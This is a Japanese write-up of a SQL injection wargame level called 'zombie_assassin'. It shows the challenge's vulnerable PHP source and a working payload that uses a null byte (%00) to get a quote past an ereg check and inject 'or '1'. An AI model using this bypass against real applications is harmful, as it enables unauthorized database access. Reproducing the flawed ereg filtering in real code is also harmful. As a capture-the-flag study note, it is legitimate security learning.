# zombie_assassin

## answer

```
https://los.eagle-jump.org/zombie_assassin_14dfa83153eb348c4aea012d453e9c8a.php?id=1&pw=2%00%27%20or%20%271
```

## problem

```
query : select id from prob_zombie_assassin where id='' and pw=''

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(@ereg("'",$_GET[id])) exit("HeHe"); 
  if(@ereg("'",$_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_zombie_assassin where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) solve("zombie_assassin"); 
  highlight_file(__FILE__); 
?>
```

## memo

```https://los.eagle-jump.org/zombie_assassin_14dfa83153eb348c4aea012d453e9c8a.php?id=1&pw=2``とかで試してみる。

```query : select id from prob_zombie_assassin where id='1' and pw='2'```となった。

コードを読んでいく。

```
if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
if(preg_match('/\\\|prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
```

細かいフィルターだが、いろいろ禁じられてはいる。

また、[troll](./troll.md)のときに紹介した現在非推奨の関数eregが再び出てきている。

```
if(@ereg("'",$_GET[id])) exit("HeHe"); 
if(@ereg("'",$_GET[pw])) exit("HeHe"); 
```

asciiは打ち込めそうなので、と同じ手法を使う。
'はchar(39)

```
?id=1&pw=2char(39)OR(1)
```

```
query : select id from prob_zombie_assassin where id='1' and pw='2char(39)OR(1)'
```

こうなって誰に見られてるわけでもないのに、ちょっと恥ずかった。違うっぽい。

じゃあどうやるのか。このコードの書き方には違和感があるので、eregの脆弱性を調べていた。

見つかったのは、eregのヌルバイト攻撃を許してしまう脆弱性というものである。
ヌルバイト攻撃とは、ASCIIコード0の文字（ヌル文字）を用いることでセキュリティチェックを無効化するという脆弱性だ。

```%00```に続いてexploitを注入する。エスクプロイトは以下のようになる。


```
?id=1&pw=2%00%27%20or%20%271
```

ZOMBIE_ASSASSINなので、ASSASIN関係あるのかなって思ってたらマジで何も関係なかった。

## references

- [preg_match | php manual](https://www.php.net/manual/ja/function.preg-match.php)

- [ereg | php manual](https://www.php.net/manual/ja/function.ereg.php)

- [mysql_fetch_array | php manual](https://www.php.net/manual/ja/function.mysql-fetch-array.php)

- [mysql_query | php manual](https://www.php.net/manual/ja/function.mysql-query.php)

- [highlight_file | php manual](https://www.php.net/manual/ja/function.highlight-file.php)

- [nullbytes attack|php manual](https://www.php.net/manual/ja/security.filesystem.nullbytes.php)

